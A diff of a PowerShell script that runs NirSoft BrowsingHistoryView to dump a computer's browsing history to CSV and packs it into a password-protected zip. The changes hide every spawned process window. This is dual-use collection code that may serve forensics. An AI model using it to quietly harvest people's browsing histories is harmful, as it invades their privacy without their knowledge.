@@ -23,6 +23,7 @@ else
     echo "Creating directory..."
 	New-Item -Path $Env:PUBLIC\$Env:COMPUTERNAME -ItemType Directory
 }
+
 # Please refer to https://www.nirsoft.net/utils/browsing_history_view.html for the BrowsingHistoryView
 if (Test-Path -Path "$Env:PUBLIC\browsinghistoryview-x64.zip")
 {
@@ -34,54 +35,63 @@ if (Test-Path -Path "$Env:PUBLIC\browsinghistoryview-x64.zip")
         {
             Get-Process -Name 7za | kill
         }	
+
+        echo ""
         Try{
             echo "Starting 7-Zip to extract files..."
             $pinfo = New-Object System.Diagnostics.ProcessStartInfo
             $pinfo.FileName = "$Env:PUBLIC\7za.exe"
-            $pinfo.WorkingDirectory = "$Env:PUBLIC\HistoryView"
+            $pinfo.WorkingDirectory = "$Env:PUBLIC"
             $pinfo.Arguments = "x $ENV:PUBLIC\browsinghistoryview-x64.zip -aos -o$Env:PUBLIC\HistoryView"
+            $pinfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
             $p = New-Object System.Diagnostics.Process
             $p.StartInfo = $pinfo
             $p.Start() | Out-Null
             $p.WaitForExit()
-            echo "Extraction completed successfully."
+            echo "[+] Extraction completed successfully."
         }
         Catch
         {
-            echo "An error occurred during extraction. Exiting..."
+            echo "[-] An error occurred during extraction. Exiting..."
             exit
         }
 
+        echo ""
         Try{
             echo "Starting BrowsingHistoryView..."
             $pinfo = New-Object System.Diagnostics.ProcessStartInfo
             $pinfo.FileName = "$Env:PUBLIC\HistoryView\BrowsingHistoryView.exe"
+            $pinfo.WorkingDirectory = "$Env:PUBLIC\HistoryView"
             $pinfo.Arguments = "/SaveDirect /HistorySource 1 /scomma $Env:PUBLIC\$Env:COMPUTERNAME\history.csv"
+            $pinfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
             $p = New-Object System.Diagnostics.Process
             $p.StartInfo = $pinfo
             $p.Start() | Out-Null
+            echo "BrowsingHistoryView started successfully."
             $p.WaitForExit()
-            echo "BrowsingHistoryView completed successfully."
+            echo "[+] Capture completed."
         }
         Catch{
-            echo "An error occurred while starting BrowsingHistoryView. Exiting..."
+            echo "[-] An error occurred while starting BrowsingHistoryView. Exiting..."
             exit
         }
 
+        echo ""
         Try{
             echo "Starting 7-Zip to compress files with password..."
             $pinfo = New-Object System.Diagnostics.ProcessStartInfo
             $pinfo.FileName = "$Env:PUBLIC\7za.exe"
-            $pinfo.WorkingDirectory = "$Env:PUBLIC\$Env:COMPUTERNAME"
+            $pinfo.WorkingDirectory = "$Env:PUBLIC"
             $pinfo.Arguments = "a $Env:PUBLIC\$Env:COMPUTERNAME\history.zip $Env:PUBLIC\$Env:COMPUTERNAME\history.csv -pYOUR_PASSWORD"
+            $pinfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
             $p = New-Object System.Diagnostics.Process
             $p.StartInfo = $pinfo
             $p.Start() | Out-Null
             $p.WaitForExit()
-            echo "Compression completed successfully."
+            echo "[+] Compression completed successfully."
         }
         Catch{
-            echo "An error occurred during compression. Exiting..."
+            echo "[-] An error occurred during compression. Exiting..."
             exit
         }
 
@@ -100,12 +110,12 @@ if (Test-Path -Path "$Env:PUBLIC\browsinghistoryview-x64.zip")
     }
     else
     {
-        echo "7-Zip executable not found. Exiting..."
+        echo "[-] 7-Zip executable not found. Exiting..."
         exit
     }
 }
 else
 {
-	echo "BrowsingHistoryView archive not found. Exiting..."
+	echo "[-] BrowsingHistoryView archive not found. Exiting..."
 	exit
 }
